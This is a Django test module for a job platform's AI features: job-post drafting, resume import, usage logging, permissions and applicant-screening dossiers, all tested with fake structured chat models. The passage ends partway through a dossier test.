from datetime import timedelta
from typing import Any
from unittest.mock import patch

from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import TestCase, override_settings
from django.utils import timezone
from langchain_core.runnables import RunnableLambda
from rest_framework.test import APITestCase
from rest_framework_simplejwt.tokens import RefreshToken

from apps.accounts.models import UserAccount
from apps.ai.testing import FakeStructuredChatModel


def _auth(client, user):
    token = RefreshToken.for_user(user)
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {token.access_token}")


class AIUsageLogTests(TestCase):
    def test_creates_row_with_feature_choice(self):
        from apps.ai.models import AIUsageLog
        user = UserAccount.objects.create_user(
            email="co@example.com", password="Str0ng-Password!", user_type="company")
        row = AIUsageLog.objects.create(
            feature=AIUsageLog.Feature.JOB_POST_WRITER,
            user=user,
            model="gemini-2.5-flash",
            input_tokens=100,
            output_tokens=50,
            latency_ms=1200,
        )
        self.assertEqual(row.feature, "job_post_writer")
        self.assertIsNotNone(row.id)

    def test_user_delete_keeps_log(self):
        from apps.ai.models import AIUsageLog
        user = UserAccount.objects.create_user(
            email="co2@example.com", password="Str0ng-Password!", user_type="company")
        row = AIUsageLog.objects.create(
            feature=AIUsageLog.Feature.CHAT, user=user, model="m")
        user.delete()
        row.refresh_from_db()
        self.assertIsNone(row.user)


class ModelFactoryTests(TestCase):
    def test_flash_tier_uses_configured_model(self):
        import config
        from apps.ai.llm import get_model
        model = get_model('flash')
        # ChatGoogleGenerativeAI normalises to 'models/<id>'
        self.assertIn(config.AI_MODEL_FLASH, model.model)

    def test_pro_tier_uses_configured_model(self):
        import config
        from apps.ai.llm import get_model
        self.assertIn(config.AI_MODEL_PRO, get_model('pro').model)

    def test_unknown_tier_raises(self):
        from apps.ai.llm import get_model
        with self.assertRaises(ValueError):
            get_model('turbo')


class SchemaTests(TestCase):
    def test_job_post_draft_validates(self):
        from apps.ai.schemas import JobPostDraft
        draft = JobPostDraft(
            job_title="Backend Dev",
            job_description="Build APIs.",
            suggested_skills=[
                {"skill_name": "Python", "skill_level": "Advanced", "is_required": True},
            ],
        )
        self.assertEqual(draft.suggested_skills[0].skill_name, "Python")

    def test_bad_skill_level_rejected(self):
        from pydantic import ValidationError
        from apps.ai.schemas import JobPostDraft
        with self.assertRaises(ValidationError):
            JobPostDraft(
                job_title="X", job_description="Y",
                suggested_skills=[
                    {"skill_name": "Python", "skill_level": "Ninja", "is_required": True},
                ],
            )


class PromptTests(TestCase):
    def test_prompt_carries_notes_and_taxonomy(self):
        from apps.ai.prompts import build_job_post_writer_prompt
        messages = build_job_post_writer_prompt(
            notes="need a django dev",
            company_name="Acme",
            business_stream="Tech",
            job_type_name="Full-time",
            location_hint="Manila",
            skill_names=["Django", "Python"],
        )
        human = messages[-1][1]
        self.assertIn("need a django dev", human)
        self.assertIn("Django", human)
        self.assertIn("Acme", human)
        self.assertEqual(messages[0][0], "system")

    def test_empty_skill_taxonomy_renders_fallback_text(self):
        from apps.ai.prompts import build_job_post_writer_prompt
        messages = build_job_post_writer_prompt(
            notes="need a dev",
            company_name="Acme",
            business_stream="Tech",
            job_type_name="",
            location_hint="",
            skill_names=[],
        )
        human = messages[-1][1]
        self.assertIn("(none available — suggest no skills)", human)


class GenerateJobPostDraftTests(TestCase):
    def setUp(self):
        from apps.seekers.models import SkillSet
        self.company_user = UserAccount.objects.create_user(
            email="acme@example.com", password="Str0ng-Password!", user_type="company")
        profile = self.company_user.company_profile
        profile.company_name = "Acme"
        profile.save()
        self.python = SkillSet.objects.create(skill_name="Python")
        SkillSet.objects.create(skill_name="Django")

    def _draft(self, skills):
        from apps.ai.schemas import JobPostDraft
        return JobPostDraft(
            job_title="Backend Dev", job_description="Build APIs.",
            suggested_skills=skills,
        )

    def test_happy_path_maps_names_to_ids_and_drops_inventions(self):
        from apps.ai.services import generate_job_post_draft
        from apps.ai.testing import FakeStructuredChatModel
        fake = FakeStructuredChatModel([self._draft([
            {"skill_name": "python", "skill_level": "Advanced", "is_required": True},
            {"skill_name": "Blockchain Ninja", "skill_level": "Expert", "is_required": False},
        ])])
        result = generate_job_post_draft(
            self.company_user, notes="need a dev", model=fake)
        self.assertEqual(result["job_title"], "Backend Dev")
        self.assertEqual(len(result["suggested_skills"]), 1)  # invention dropped
        self.assertEqual(result["suggested_skills"][0]["skill_set_id"], str(self.python.id))
        self.assertEqual(result["suggested_skills"][0]["skill_name"], "Python")

    def test_writes_usage_log_row(self):
        from apps.ai.models import AIUsageLog
        from apps.ai.services import generate_job_post_draft
        from apps.ai.testing import FakeStructuredChatModel
        fake = FakeStructuredChatModel([self._draft([])])
        generate_job_post_draft(self.company_user, notes="n", model=fake)
        row = AIUsageLog.objects.get()  # exactly one row for a first-try success
        self.assertEqual(row.feature, "job_post_writer")
        self.assertEqual(row.input_tokens, 100)
        self.assertEqual(row.output_tokens, 50)
        self.assertEqual(row.user, self.company_user)

    def test_missing_company_profile_raises(self):
        from apps.ai.exceptions import CompanyProfileMissingError
        from apps.ai.models import AIUsageLog
        from apps.ai.services import generate_job_post_draft
        from apps.ai.testing import FakeStructuredChatModel
        self.company_user.company_profile.delete()
        # Reload: the descriptor cache on self.company_user still holds the
        # now-deleted Company instance from the access above.
        fresh_user = UserAccount.objects.get(pk=self.company_user.pk)
        fake = FakeStructuredChatModel([self._draft([])])
        with self.assertRaises(CompanyProfileMissingError):
            generate_job_post_draft(fresh_user, notes="n", model=fake)
        self.assertEqual(AIUsageLog.objects.count(), 0)  # no LLM call was made

    def test_parse_fail_then_success_writes_two_usage_rows(self):
        from apps.ai.models import AIUsageLog
        from apps.ai.services import generate_job_post_draft
        from apps.ai.testing import FakeStructuredChatModel
        fake = FakeStructuredChatModel([None, self._draft([])])
        result = generate_job_post_draft(self.company_user, notes="n", model=fake)
        self.assertEqual(result["job_title"], "Backend Dev")
        self.assertEqual(AIUsageLog.objects.count(), 2)  # parse failure + success

    def test_provider_error_retries_once_then_raises(self):
        from apps.ai.exceptions import AIProviderError
        from apps.ai.models import AIUsageLog
        from apps.ai.services import generate_job_post_draft
        from apps.ai.testing import FakeStructuredChatModel
        fake = FakeStructuredChatModel([RuntimeError("boom"), RuntimeError("boom")])
        with self.assertRaises(AIProviderError):
            generate_job_post_draft(self.company_user, notes="n", model=fake)
        self.assertEqual(fake.parsed_outputs, [])  # both attempts consumed
        self.assertEqual(AIUsageLog.objects.count(), 0)  # no result object ever returned

    def test_provider_error_then_success_recovers(self):
        from apps.ai.services import generate_job_post_draft
        from apps.ai.testing import FakeStructuredChatModel
        fake = FakeStructuredChatModel([RuntimeError("boom"), self._draft([])])
        result = generate_job_post_draft(self.company_user, notes="n", model=fake)
        self.assertEqual(result["job_title"], "Backend Dev")

    def test_quota_error_raises_immediately_without_retry(self):
        from apps.ai.exceptions import AIQuotaExceededError
        from apps.ai.models import AIUsageLog
        from apps.ai.services import generate_job_post_draft
        from apps.ai.testing import FakeStructuredChatModel
        quota = RuntimeError("429 RESOURCE_EXHAUSTED: quota exceeded")
        fake = FakeStructuredChatModel([quota, self._draft([])])
        with self.assertRaises(AIQuotaExceededError):
            generate_job_post_draft(self.company_user, notes="n", model=fake)
        self.assertEqual(len(fake.parsed_outputs), 1)  # no second attempt
        self.assertEqual(AIUsageLog.objects.count(), 0)  # no result object ever returned

    def test_unparseable_output_raises_invalid_after_retry(self):
        from apps.ai.exceptions import AIResponseInvalidError
        from apps.ai.models import AIUsageLog
        from apps.ai.services import generate_job_post_draft
        from apps.ai.testing import FakeStructuredChatModel
        fake = FakeStructuredChatModel([None, None])
        with self.assertRaises(AIResponseInvalidError):
            generate_job_post_draft(self.company_user, notes="n", model=fake)
        self.assertEqual(AIUsageLog.objects.count(), 2)  # both parse-failure attempts logged


class EmptySkillTaxonomyTests(TestCase):
    """No SkillSet rows exist yet — the taxonomy fallback text must not break drafting."""

    def setUp(self):
        self.company_user = UserAccount.objects.create_user(
            email="notaxonomy@example.com", password="Str0ng-Password!", user_type="company")
        profile = self.company_user.company_profile
        profile.company_name = "Acme"
        profile.save()

    def test_empty_skill_taxonomy_still_generates_draft(self):
        from apps.ai.schemas import JobPostDraft
        from apps.ai.services import generate_job_post_draft
        from apps.ai.testing import FakeStructuredChatModel
        draft = JobPostDraft(
            job_title="Backend Dev", job_description="Build APIs.",
            suggested_skills=[],
        )
        fake = FakeStructuredChatModel([draft])
        result = generate_job_post_draft(self.company_user, notes="n", model=fake)
        self.assertEqual(result["job_title"], "Backend Dev")
        self.assertEqual(result["suggested_skills"], [])


class JobPostAssistEndpointTests(APITestCase):
    URL = "/api/v1/ai/job-post-assist/"

    def setUp(self):
        from apps.seekers.models import SkillSet
        self.company_user = UserAccount.objects.create_user(
            email="co@example.com", password="Str0ng-Password!", user_type="company")
        self.seeker = UserAccount.objects.create_user(
            email="sk@example.com", password="Str0ng-Password!", user_type="job_seeker")
        self.python = SkillSet.objects.create(skill_name="Python")

    def _fake(self, *items):
        from apps.ai.testing import FakeStructuredChatModel
        return FakeStructuredChatModel(list(items))

    def _ok_draft(self):
        from apps.ai.schemas import JobPostDraft
        return JobPostDraft(
            job_title="Backend Dev", job_description="Build APIs.",
            suggested_skills=[{"skill_name": "Python",
                               "skill_level": "Advanced", "is_required": True}],
        )

    def test_anonymous_gets_401(self):
        r = self.client.post(self.URL, {"notes": "x"})
        self.assertEqual(r.status_code, 401)

    def test_seeker_gets_403(self):
        _auth(self.client, self.seeker)
        r = self.client.post(self.URL, {"notes": "x"})
        self.assertEqual(r.status_code, 403)

    def test_missing_notes_gets_400(self):
        _auth(self.client, self.company_user)
        r = self.client.post(self.URL, {})
        self.assertEqual(r.status_code, 400)

    def test_oversized_notes_gets_400(self):
        _auth(self.client, self.company_user)
        r = self.client.post(self.URL, {"notes": "x" * 4001})
        self.assertEqual(r.status_code, 400)

    def test_missing_company_profile_gets_400(self):
        _auth(self.client, self.company_user)
        self.company_user.company_profile.delete()
        r = self.client.post(self.URL, {"notes": "need a django dev"})
        self.assertEqual(r.status_code, 400)
        self.assertIn("company profile", r.data["error"])

    def test_company_gets_draft_with_real_skill_ids(self):
        _auth(self.client, self.company_user)
        with patch("apps.ai.services.get_model", return_value=self._fake(self._ok_draft())):
            r = self.client.post(self.URL, {"notes": "need a django dev"})
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.data["job_title"], "Backend Dev")
        self.assertEqual(
            r.data["suggested_skills"][0]["skill_set_id"], str(self.python.id))

    def test_quota_error_maps_to_429(self):
        _auth(self.client, self.company_user)
        boom = RuntimeError("429 RESOURCE_EXHAUSTED")
        with patch("apps.ai.services.get_model", return_value=self._fake(boom)):
            r = self.client.post(self.URL, {"notes": "x"})
        self.assertEqual(r.status_code, 429)

    def test_provider_error_maps_to_502(self):
        _auth(self.client, self.company_user)
        with patch("apps.ai.services.get_model",
                   return_value=self._fake(RuntimeError("boom"), RuntimeError("boom"))):
            r = self.client.post(self.URL, {"notes": "x"})
        self.assertEqual(r.status_code, 502)

    def test_throttle_classes_are_the_four_layer_stack(self):
        from apps.ai import views
        from apps.ai.throttling import AIRateThrottle
        from jobApp.throttling import BurstRateThrottle
        from rest_framework.throttling import AnonRateThrottle, UserRateThrottle
        self.assertEqual(
            views.job_post_assist.cls.throttle_classes,
            [AnonRateThrottle, UserRateThrottle, BurstRateThrottle, AIRateThrottle])


class ResumeSchemaTests(TestCase):
    def test_resume_extract_validates_and_mirrors_model_fields(self):
        from apps.ai.schemas import ResumeExtract
        extract = ResumeExtract(
            education=[{
                "institute_university_name": "MIT",
                "degree_type": "Bachelor",
                "field_of_study": "CS",
                "academic_details": "",
                "percentage": 92.5,
                "start_date": "2018-06-01",
                "end_date": None,
            }],
            experience=[{
                "company_name": "Acme",
                "position": "Dev",
                "description": "Built APIs",
                "job_location_city": "Manila",
                "job_location_country": "PH",
                "start_date": None,
                "end_date": None,
            }],
            skills=[{"skill_name": "Python", "skill_level": "Advanced"}],
        )
        dumped = extract.education[0].model_dump()
        # Keys must match EducationData model fields so the frontend can POST
        # the confirmed draft to the existing seekers CRUD endpoints unchanged.
        self.assertEqual(
            set(dumped),
            {"institute_university_name", "degree_type", "field_of_study",
             "academic_details", "percentage", "start_date", "end_date"})

    def test_bad_degree_type_rejected(self):
        from pydantic import ValidationError
        from apps.ai.schemas import EducationEntry
        with self.assertRaises(ValidationError):
            EducationEntry(
                institute_university_name="X", degree_type="Ninja",
                field_of_study="", academic_details="", percentage=None,
                start_date=None, end_date=None)

    def test_bad_skill_level_rejected(self):
        from pydantic import ValidationError
        from apps.ai.schemas import ResumeSkill
        with self.assertRaises(ValidationError):
            ResumeSkill(skill_name="Python", skill_level="Ninja")


class IsSeekerUserTests(TestCase):
    def test_gates_by_user_type(self):
        from unittest.mock import Mock
        from apps.ai.permissions import IsSeekerUser
        perm = IsSeekerUser()
        seeker = Mock(is_authenticated=True, user_type="job_seeker")
        company = Mock(is_authenticated=True, user_type="company")
        anon = Mock(is_authenticated=False, user_type=None)
        self.assertTrue(perm.has_permission(Mock(user=seeker), None))
        self.assertFalse(perm.has_permission(Mock(user=company), None))
        self.assertFalse(perm.has_permission(Mock(user=anon), None))


class ResumePromptTests(TestCase):
    def test_text_message_carries_resume_text(self):
        from apps.ai.prompts import build_resume_import_messages
        msgs = build_resume_import_messages(resume_text="my resume text")
        self.assertEqual(msgs[0][0], "system")
        human = msgs[-1]
        self.assertEqual(len(human.content), 1)
        self.assertEqual(human.content[0]["type"], "text")
        self.assertIn("my resume text", human.content[0]["text"])

    def test_pdf_message_carries_inline_file_block(self):
        from apps.ai.prompts import build_resume_import_messages
        msgs = build_resume_import_messages(pdf_b64="QUJD")
        human = msgs[-1]
        block = human.content[0]
        self.assertEqual(block["type"], "file")
        self.assertEqual(block["source_type"], "base64")
        self.assertEqual(block["mime_type"], "application/pdf")
        self.assertEqual(block["data"], "QUJD")
        self.assertEqual(human.content[1]["type"], "text")


class ExtractResumeTests(TestCase):
    def setUp(self):
        from apps.seekers.models import SkillSet
        self.seeker = UserAccount.objects.create_user(
            email="seeker@example.com", password="Str0ng-Password!",
            user_type="job_seeker")
        self.python = SkillSet.objects.create(skill_name="Python")

    def _extract(self, skills=None, education=None, experience=None):
        from apps.ai.schemas import ResumeExtract
        return ResumeExtract(
            education=education or [], experience=experience or [],
            skills=skills or [])

    def _pdf(self, content=b"%PDF-1.4 fake resume", name="r.pdf"):
        return SimpleUploadedFile(name, content, content_type="application/pdf")

    def test_maps_known_skills_and_collects_new_suggestions(self):
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        fake = FakeStructuredChatModel([self._extract(skills=[
            {"skill_name": "python", "skill_level": "Advanced"},
            {"skill_name": "Kubernetes", "skill_level": "Expert"},
            {"skill_name": "kubernetes", "skill_level": "Expert"},
        ])])
        result = extract_resume(self.seeker, text="resume", model=fake)
        self.assertEqual(len(result["skills"]), 1)
        self.assertEqual(result["skills"][0]["skill_set_id"], str(self.python.id))
        self.assertEqual(result["skills"][0]["skill_name"], "Python")
        self.assertEqual(result["new_skill_suggestions"], ["Kubernetes"])  # deduped

    def test_education_and_experience_pass_through_model_shaped(self):
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        edu = {"institute_university_name": "MIT", "degree_type": "Bachelor",
               "field_of_study": "CS", "academic_details": "", "percentage": None,
               "start_date": "2018-01-01", "end_date": None}
        fake = FakeStructuredChatModel([self._extract(education=[edu])])
        result = extract_resume(self.seeker, text="resume", model=fake)
        self.assertEqual(result["education"], [edu])
        self.assertEqual(result["experience"], [])

    def test_writes_usage_log_with_resume_feature(self):
        from apps.ai.models import AIUsageLog
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        extract_resume(self.seeker, text="resume",
                       model=FakeStructuredChatModel([self._extract()]))
        row = AIUsageLog.objects.get()
        self.assertEqual(row.feature, "resume_import")
        self.assertEqual(row.user, self.seeker)

    def test_both_text_and_file_rejected(self):
        from apps.ai.exceptions import InvalidResumeFileError
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        with self.assertRaises(InvalidResumeFileError):
            extract_resume(self.seeker, text="resume", file=self._pdf(),
                           model=FakeStructuredChatModel([]))

    def test_neither_text_nor_file_rejected(self):
        from apps.ai.exceptions import InvalidResumeFileError
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        with self.assertRaises(InvalidResumeFileError):
            extract_resume(self.seeker, text="",
                           model=FakeStructuredChatModel([]))

    def test_oversized_pdf_rejected(self):
        from apps.ai.exceptions import InvalidResumeFileError
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        big = self._pdf(content=b"%PDF-" + b"x" * (5 * 1024 * 1024))
        with self.assertRaises(InvalidResumeFileError):
            extract_resume(self.seeker, file=big,
                           model=FakeStructuredChatModel([]))

    def test_non_pdf_magic_bytes_rejected(self):
        from apps.ai.exceptions import InvalidResumeFileError
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        with self.assertRaises(InvalidResumeFileError):
            extract_resume(self.seeker, file=self._pdf(content=b"NOTAPDF"),
                           model=FakeStructuredChatModel([]))

    def test_validation_failures_write_no_usage_rows(self):
        from apps.ai.exceptions import InvalidResumeFileError
        from apps.ai.models import AIUsageLog
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        with self.assertRaises(InvalidResumeFileError):
            extract_resume(self.seeker, text="",
                           model=FakeStructuredChatModel([]))
        self.assertEqual(AIUsageLog.objects.count(), 0)

    def test_pdf_happy_path(self):
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        result = extract_resume(self.seeker, file=self._pdf(),
                                model=FakeStructuredChatModel([self._extract()]))
        self.assertEqual(result["skills"], [])

    def test_pdf_at_exact_size_cap_accepted(self):
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        content = b"%PDF-" + b"x" * (5 * 1024 * 1024 - 5)
        self.assertEqual(len(content), 5 * 1024 * 1024)
        pdf = self._pdf(content=content)
        result = extract_resume(self.seeker, file=pdf,
                                model=FakeStructuredChatModel([self._extract()]))
        self.assertEqual(result["skills"], [])

    def test_degree_type_none_coerced_to_empty_string(self):
        from apps.ai.services import extract_resume
        from apps.ai.testing import FakeStructuredChatModel
        edu = {"institute_university_name": "MIT", "degree_type": None,
               "field_of_study": "CS", "academic_details": "", "percentage": None,
               "start_date": "2018-01-01", "end_date": None}
        fake = FakeStructuredChatModel([self._extract(education=[edu])])
        result = extract_resume(self.seeker, text="resume", model=fake)
        self.assertEqual(result["education"][0]["degree_type"], "")


class ResumeImportEndpointTests(APITestCase):
    URL = "/api/v1/ai/resume-import/"

    def setUp(self):
        from apps.seekers.models import SkillSet
        self.seeker = UserAccount.objects.create_user(
            email="rs@example.com", password="Str0ng-Password!",
            user_type="job_seeker")
        self.company_user = UserAccount.objects.create_user(
            email="rc@example.com", password="Str0ng-Password!",
            user_type="company")
        self.python = SkillSet.objects.create(skill_name="Python")

    def _fake(self, *items):
        from apps.ai.testing import FakeStructuredChatModel
        return FakeStructuredChatModel(list(items))

    def _ok_extract(self):
        from apps.ai.schemas import ResumeExtract
        return ResumeExtract(
            education=[], experience=[],
            skills=[{"skill_name": "Python", "skill_level": "Advanced"},
                    {"skill_name": "Kubernetes", "skill_level": "Expert"}])

    def test_anonymous_gets_401(self):
        r = self.client.post(self.URL, {"text": "resume"})
        self.assertEqual(r.status_code, 401)

    def test_company_gets_403(self):
        _auth(self.client, self.company_user)
        r = self.client.post(self.URL, {"text": "resume"})
        self.assertEqual(r.status_code, 403)

    def test_seeker_gets_draft_with_mapped_and_new_skills(self):
        _auth(self.client, self.seeker)
        with patch("apps.ai.services.get_model",
                   return_value=self._fake(self._ok_extract())):
            r = self.client.post(self.URL, {"text": "my resume"})
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.data["skills"][0]["skill_set_id"], str(self.python.id))
        self.assertEqual(r.data["new_skill_suggestions"], ["Kubernetes"])

    def test_pdf_upload_works(self):
        from django.core.files.uploadedfile import SimpleUploadedFile
        _auth(self.client, self.seeker)
        pdf = SimpleUploadedFile("r.pdf", b"%PDF-1.4 fake",
                                 content_type="application/pdf")
        with patch("apps.ai.services.get_model",
                   return_value=self._fake(self._ok_extract())):
            r = self.client.post(self.URL, {"file": pdf}, format="multipart")
        self.assertEqual(r.status_code, 200)

    def test_both_text_and_file_gets_400(self):
        from django.core.files.uploadedfile import SimpleUploadedFile
        _auth(self.client, self.seeker)
        pdf = SimpleUploadedFile("r.pdf", b"%PDF-1.4 fake",
                                 content_type="application/pdf")
        r = self.client.post(self.URL, {"text": "resume", "file": pdf},
                             format="multipart")
        self.assertEqual(r.status_code, 400)

    def test_neither_gets_400(self):
        _auth(self.client, self.seeker)
        r = self.client.post(self.URL, {})
        self.assertEqual(r.status_code, 400)

    def test_non_pdf_gets_400(self):
        from django.core.files.uploadedfile import SimpleUploadedFile
        _auth(self.client, self.seeker)
        bad = SimpleUploadedFile("r.pdf", b"NOTAPDF",
                                 content_type="application/pdf")
        r = self.client.post(self.URL, {"file": bad}, format="multipart")
        self.assertEqual(r.status_code, 400)

    def test_quota_error_maps_to_429(self):
        _auth(self.client, self.seeker)
        boom = RuntimeError("429 RESOURCE_EXHAUSTED")
        with patch("apps.ai.services.get_model", return_value=self._fake(boom)):
            r = self.client.post(self.URL, {"text": "resume"})
        self.assertEqual(r.status_code, 429)

    def test_provider_error_maps_to_502(self):
        _auth(self.client, self.seeker)
        with patch("apps.ai.services.get_model",
                   return_value=self._fake(RuntimeError("boom"),
                                           RuntimeError("boom"))):
            r = self.client.post(self.URL, {"text": "resume"})
        self.assertEqual(r.status_code, 502)

    def test_throttle_classes_are_the_four_layer_stack(self):
        from apps.ai import views
        from apps.ai.throttling import AIRateThrottle
        from jobApp.throttling import BurstRateThrottle
        from rest_framework.throttling import AnonRateThrottle, UserRateThrottle
        self.assertEqual(
            views.resume_import.cls.throttle_classes,
            [AnonRateThrottle, UserRateThrottle, BurstRateThrottle, AIRateThrottle])


class ScreeningReportModelTests(TestCase):
    def _job_post(self):
        from apps.jobs.models import JobLocation, JobPost, JobType
        company_user = UserAccount.objects.create_user(
            email="screenco@example.com", password="Str0ng-Password!", user_type="company")
        company = company_user.company_profile
        company.company_name = "Acme"
        company.save()
        return JobPost.objects.create(
            company=company,
            job_type=JobType.objects.create(job_type_name="Full-time"),
            job_location=JobLocation.objects.create(city="Cebu", country="PH"),
            job_title="Backend Engineer",
            job_description="Build APIs.",
        )

    def test_stores_report_payload_and_count(self):
        from apps.ai.models import ScreeningReport
        job_post = self._job_post()
        report = ScreeningReport.objects.create(
            job_post=job_post,
            report={"candidates": [], "truncated": False, "excluded_count": 0},
            applicant_count=3,
        )
        report.refresh_from_db()
        self.assertEqual(report.report["truncated"], False)
        self.assertEqual(report.applicant_count, 3)
        self.assertIsNotNone(report.id)

    def test_newest_first_ordering(self):
        from apps.ai.models import ScreeningReport
        job_post = self._job_post()
        older = ScreeningReport.objects.create(
            job_post=job_post, report={}, applicant_count=1)
        newer = ScreeningReport.objects.create(
            job_post=job_post, report={}, applicant_count=2)
        self.assertEqual(
            list(ScreeningReport.objects.filter(job_post=job_post)), [newer, older])

    def test_deleting_job_post_deletes_reports(self):
        from apps.ai.models import ScreeningReport
        job_post = self._job_post()
        ScreeningReport.objects.create(job_post=job_post, report={}, applicant_count=1)
        job_post.delete()
        self.assertEqual(ScreeningReport.objects.count(), 0)


class IsCompanyUserOrAdminTests(TestCase):
    def _check(self, user):
        from apps.ai.permissions import IsCompanyUserOrAdmin
        request = type("R", (), {"user": user})()
        return IsCompanyUserOrAdmin().has_permission(request, None)

    def test_company_user_allowed(self):
        user = UserAccount.objects.create_user(
            email="c1@example.com", password="Str0ng-Password!", user_type="company")
        self.assertTrue(self._check(user))

    def test_seeker_user_denied(self):
        user = UserAccount.objects.create_user(
            email="s1@example.com", password="Str0ng-Password!", user_type="job_seeker")
        self.assertFalse(self._check(user))

    def test_staff_seeker_allowed(self):
        user = UserAccount.objects.create_user(
            email="s2@example.com", password="Str0ng-Password!", user_type="job_seeker")
        user.is_staff = True
        user.save()
        self.assertTrue(self._check(user))

    def test_superuser_seeker_allowed(self):
        user = UserAccount.objects.create_user(
            email="s3@example.com", password="Str0ng-Password!", user_type="job_seeker")
        user.is_superuser = True
        user.save()
        self.assertTrue(self._check(user))

    def test_anonymous_denied(self):
        from django.contrib.auth.models import AnonymousUser
        self.assertFalse(self._check(AnonymousUser()))


class ScreeningSchemaTests(TestCase):
    def test_candidate_assessment_round_trips(self):
        from apps.ai.schemas import CandidateAssessment
        item = CandidateAssessment(
            candidate_ref="candidate_2", score=88,
            strengths=["5 years Django"], gaps=["No Kubernetes"],
            summary="Strong backend fit.")
        self.assertEqual(item.candidate_ref, "candidate_2")
        self.assertEqual(item.score, 88)

    def test_screening_result_holds_candidates(self):
        from apps.ai.schemas import CandidateAssessment, ScreeningResult
        result = ScreeningResult(candidates=[
            CandidateAssessment(candidate_ref="candidate_1", score=50,
                                strengths=[], gaps=[], summary="ok"),
        ])
        self.assertEqual(len(result.candidates), 1)

    def test_candidate_requires_every_field(self):
        from pydantic import ValidationError
        from apps.ai.schemas import CandidateAssessment
        with self.assertRaises(ValidationError):
            CandidateAssessment(candidate_ref="candidate_1", score=50)


class ScreeningPromptTests(TestCase):
    def _build(self, **overrides):
        from apps.ai.prompts import build_screening_prompt
        kwargs = dict(
            job_title="Backend Engineer",
            job_description="Build and run our APIs.",
            required_skills=["Python (Advanced, required)"],
            dossiers=["candidate_1:\nName: Jane Doe\nSkills: Python (Advanced)"],
        )
        kwargs.update(overrides)
        return build_screening_prompt(**kwargs)

    def test_first_message_is_the_system_prompt(self):
        from apps.ai.prompts import SCREENING_SYSTEM
        messages = self._build()
        self.assertEqual(messages[0], ("system", SCREENING_SYSTEM))

    def test_human_message_carries_job_and_dossiers(self):
        messages = self._build()
        human = messages[1][1]
        self.assertIn("Backend Engineer", human)
        self.assertIn("Build and run our APIs.", human)
        self.assertIn("Python (Advanced, required)", human)
        self.assertIn("candidate_1", human)
        self.assertIn("Jane Doe", human)

    def test_empty_required_skills_renders_placeholder(self):
        human = self._build(required_skills=[])[1][1]
        self.assertIn("(none listed)", human)

    def test_system_prompt_warns_about_untrusted_dossiers(self):
        from apps.ai.prompts import SCREENING_SYSTEM
        self.assertIn("untrusted", SCREENING_SYSTEM.lower())


class _ScreeningFixture:
    """Company + job post + applicant factory shared by the screening tests.

    Registration signals auto-create Company / SeekerProfile rows, so those are
    fetched, not created.
    """

    def make_company_user(self, email="owner@example.com", company_name="Acme"):
        user = UserAccount.objects.create_user(
            email=email, password="Str0ng-Password!", user_type="company")
        company = user.company_profile
        company.company_name = company_name
        company.save()
        return user

    def make_job_post(self, company_user, title="Backend Engineer"):
        from apps.jobs.models import JobLocation, JobPost, JobType
        job_type, _ = JobType.objects.get_or_create(job_type_name="Full-time")
        location, _ = JobLocation.objects.get_or_create(city="Cebu", country="PH")
        return JobPost.objects.create(
            company=company_user.company_profile,
            job_type=job_type,
            job_location=location,
            job_title=title,
            job_description="Design, build and operate our REST APIs.",
        )

    def make_applicant(self, job_post, email, first="Jane", last="Doe",
                       skill_name="Python", cover_letter="", application_date=None):
        from apps.jobs.models import JobPostActivity
        from apps.seekers.models import EducationData, ExperienceData, SeekerSkillSet, SkillSet
        user = UserAccount.objects.create_user(
            email=email, password="Str0ng-Password!", user_type="job_seeker")
        profile = user.seeker_profile
        profile.first_name, profile.last_name = first, last
        profile.save()
        skill, _ = SkillSet.objects.get_or_create(skill_name=skill_name)
        SeekerSkillSet.objects.create(
            user_account=user, skill_set=skill, skill_level="Advanced")
        EducationData.objects.create(
            user_account=user, institute_university_name="State University",
            degree_type="Bachelor", field_of_study="Computer Science",
            start_date="2016-01-01", end_date="2020-01-01")
        ExperienceData.objects.create(
            user_account=user, company_name="Prior Corp", position="Engineer",
            description="Maintained internal services.",
            start_date="2020-02-01", end_date="2024-01-01")
        kwargs = {"user_account": user, "job_post": job_post,
                  "cover_letter": cover_letter}
        if application_date is not None:
            kwargs["application_date"] = application_date
        return JobPostActivity.objects.create(**kwargs)


class DossierAssemblyTests(_ScreeningFixture, TestCase):
    def test_dossier_contains_name_skills_education_experience(self):
        from apps.ai.services import _build_dossier, _fetch_applications
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "a1@example.com", first="Ada", last="Lovelace")
        activity = _fetch_applications(job_post)[0]
        text = _build_dossier("candidate_1", activity)
        self.assertIn("candidate_1", text)
        self.assertIn("Ada Lovelace", text)
        self.assertIn("Python (Advanced)", text)
        self.assertIn("State University", text)
        self.assertIn("Prior Corp", text)

    def test_dossier_never_contains_the_applicant_email(self):
        from apps.ai.services import _build_dossier, _fetch_applications
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "private@example.com")
        text = _build_dossier("candidate_1", _fetch_applications(job_post)[0])
        self.assertNotIn("private@example.com", text)

    def test_cover_letter_is_truncated(self):
        from apps.ai.services import _build_dossier, _fetch_applications
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        self.make_applicant(job_post, "a2@example.com", cover_letter="x" * 2000)
        text = _build_dossier("candidate_1", _fetch_applications(job_post)[0])
        self.assertIn("Cover letter:", text)
        self.assertLess(text.count("x"), 600)

    def test_missing_seeker_profile_does_not_raise(self):
        from apps.ai.services import _build_dossier, _fetch_applications
        owner = self.make_company_user()
        job_post = self.make_job_post(owner)
        activity = self.make_applicant(job_post, "a3@example.com")
        activity.user_account.seeker_profile.delete()
        text = _build_dossier("candidate_1", _fetch_applications(job_post)[0])
